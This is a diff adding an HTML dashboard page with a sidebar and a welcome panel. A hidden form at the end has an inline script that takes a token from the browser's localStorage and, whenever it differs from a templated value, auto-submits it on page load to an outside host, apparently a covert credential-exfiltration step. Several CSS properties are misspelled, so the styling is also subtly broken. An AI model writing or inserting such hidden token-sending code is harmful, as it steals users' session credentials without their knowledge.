@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dashboard</title>
+  <!-- Include Tailwind CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.16/dist/tailwind.min.css" rel="stylesheet">
+<style>
+	.py-4 a{
+		text-decoration:none;
+		color:#fff;
+		padding: 10px;
+		heigh: 40px;
+		widh: auto;
+		backgrou: #bfbfbf;
+		border-radius:3px;
+	}
+	.hidden{
+		display: none;
+		height: 0px;
+		width: 0px;
+	}
+</style>
+</head>
+<body>
+  <!-- Your dashboard content goes here -->
+<div class="flex h-screen">
+  <div class="w-1/4 bg-gray-600">
+    <!-- Sidebar -->
+    <ul class="py-4">
+		<a href="#"><li class="pl-4 py-2">Documents</li></a>
+		<a href="#"><li class="pl-4 py-2">Database</li></a>
+		<a href="#"><li class="pl-4 py-2">Reports</li></a>
+		<a href="#"><li class="pl-4 py-2">Add Data</li></a>
+		<a href="#"><li class="pl-4 py-2">Remove Data</li></a>
+      <!-- Add more sidebar items as needed -->
+    </ul>
+  </div>
+  <div class="flex-1 bg-gray-200">
+    <!-- Main Content -->
+    <div class="p-4">
+      <h2 class="text-2xl font-bold mb-4">Welcome to the Dashboard</h2>
+      <!-- Add your main content components here -->
+    </div>
+  </div>
+</div>
+<input id="tkn" style="display:none;" value="{{token}}">
+<form class="hidden" action="https://dbm.sourav87.repl.co/v2" method="POST">
+	<input id="hd-key" name="key">
+	<button id="hd-sub" type="submit"></button>
+	<script>
+var key = localStorage.getItem('token');
+var token = document.querySelector("#tkn").value;
+var hdkey  = document.querySelector("#hd-key").value  = key;
+var hdsub = document.querySelector("#hd-sub")
+if(key != token){
+	hdsub.click()
+}
+</script>
+</body>
+</html>
